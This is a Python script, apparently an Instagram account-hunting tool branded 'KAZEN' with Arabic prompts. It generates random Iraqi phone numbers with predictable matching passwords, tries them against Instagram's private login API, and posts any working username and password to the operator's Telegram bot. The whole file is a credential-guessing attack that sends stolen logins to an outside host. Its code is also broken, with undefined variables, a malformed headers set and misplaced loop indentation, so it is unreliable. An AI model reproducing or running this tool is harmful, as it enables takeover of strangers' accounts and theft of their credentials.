import random
from InstagramApp import Marko
from random import choice 
import requests
import requests
import time
import string
import webbrowser
import os,random
import cfonts 
from cfonts import render
import os,sys,subprocess
import requests,sys,time,os,random,pyfiglet,colorama
from time import sleep
from uuid import uuid4

url= "https://b.i.instagram.com/api/v1/accounts/login/"

headers = {'User-Agent: "Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416;huawei/google; Nexus 6P; angler; angler; en_US)'}

subprocess.getoutput("pip install requests")
import requests,sys,os,time
yso = '2792007'
pss=input("\033[1;37m [~]\033[1;35mENTER PASSWORD :\033[1;33m")
if pss ==yso:
 pass
 print("\033[1;32m          SUCCESS PASSWORD ")
else:
 exit('\033[1;31m             WORNG PASSWORD ')

os.system('clear')
         

colors = ['red','yellow','green','blue']

choice =random.choice(colors)
name = render('kazen',colors=[choice],align='center')

print (name) 


E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'
#colors
BLACK   = '\033[30m'
RED     = '\033[31m'
GREEN   = '\033[32m'
YELLOW  = '\033[33m'
BLUE    = '\033[34m'
MAGENTA = '\033[35m'
CYAN    = '\033[36m'
WHITE   = '\033[37m'
RESET   = '\033[39m'

print(S+"""@combokazen""")
print(RED+"""_____________________________""")
token=input(MAGENTA+' Bot Token:'+GREEN) 
print(RED+"""_____________________________""")
ID=input(MAGENTA+' Telegram ID:'+GREEN) 
print(RED+"""_____________________________""")


os.system('clear')


print(str(pyfiglet.figlet_format('KAZEN'))+f"{S}مصمم الااداه كازين < ممنوع تغير 😑/>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print(f"By {colorama.Fore.CYAN}@combokazenــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــ!َ{colorama.Fore.RESET}")
print(BLUE+"""بدئ الصيد 😚💞""")

print(GREEN+"""_____________________________""")

while True:
	nam = "1234567890"
	user = str(''.join((random.choice(nam) for i in range(8))))
	username = str("+96477"+user)
	password = str("077"+user)
	uid = str(uuid4)
data = {
'uuid':uid,
'password':password,
'username':username,
'device_id':uid,
'from_reg':'false',
'csrftoken':'missing',
'login_attempt.countn':'0'
}
 
req= requests.post(url, headers=headers,
data=data).text
if str("logged_in_user") in str(reg):
    	print("Done: {}:{}".format(username,password))                         
																		
hit=f"""
تَعال كازين صادلك حساب 💞🤸‍♂️
user:{username}
pas:{password}
tele : @combokazen"""

requests.post(f'https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text={hit}')   